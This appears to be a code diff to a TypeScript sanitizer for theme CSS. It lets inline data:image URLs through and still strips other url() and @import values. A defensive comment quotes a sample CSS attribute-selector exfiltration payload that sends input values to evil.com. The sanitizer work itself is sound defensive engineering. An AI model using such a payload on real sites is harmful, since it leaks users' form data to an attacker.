@@ -3,7 +3,8 @@
  * (see server/plugins/theme-resolver.ts). Theme CSS is purely declarative styling —
  * colors, spacing, typography via CSS custom properties — and never legitimately needs
  * to load external resources (fonts/images are handled through dedicated site settings,
- * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed.
+ * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed —
+ * except inline `data:image/…` URLs, which fetch nothing.
  *
  * This closes the CSS attribute-selector exfiltration technique — e.g.
  * `input[value^="a"] { background: url(https://evil.com/?leak=a) }`, which can leak DOM
@@ -33,6 +34,9 @@ function decodeCssEscapes(css: string): string {
   })
 }
 
+/** An inline image `url()` theme CSS may keep (see sanitizeThemeCss). */
+const INLINE_IMAGE_RE = /^data:image\/(?:svg\+xml|png|jpeg|gif|webp|avif)[;,]/i
+
 export function sanitizeThemeCss(css: string): string {
   let out = decodeCssEscapes(css)
   // Strip comments first so a payload can't hide/split a dangerous construct across
@@ -51,7 +55,15 @@ export function sanitizeThemeCss(css: string): string {
   // outside the alternation) — a shared trailing quantifier that can also be satisfied by
   // the fallback branch is exactly the overlapping-repetition shape that enables
   // super-linear regex backtracking on malformed input.
-  out = out.replace(/url\s*\(\s*"[^"]*"\s*\)|url\s*\(\s*'[^']*'\s*\)|url\s*\([^)]*\)/gi, 'none')
+  //
+  // The one exception is an inline image (`data:image/...`): it's part of the stylesheet
+  // itself, so nothing is fetched and nothing can be sent anywhere, and an SVG drawn as
+  // an image runs no script and loads nothing of its own. Themes use these for icons
+  // (`mask-image`), which used to turn into `none` — solid squares on the live site.
+  out = out.replace(/url\s*\(\s*"([^"]*)"\s*\)|url\s*\(\s*'([^']*)'\s*\)|url\s*\(([^)]*)\)/gi, (match, dq?: string, sq?: string, bare?: string) => {
+    const value = (dq ?? sq ?? bare ?? '').trim()
+    return INLINE_IMAGE_RE.test(value) ? match : 'none'
+  })
   // image-set()/-webkit-image-set()/cross-fade()/-webkit-cross-fade() also resolve to an
   // external image reference (per the CSS Images spec) but take a bare quoted string
   // instead of url(...), so they carry the exact same attribute-selector exfiltration risk
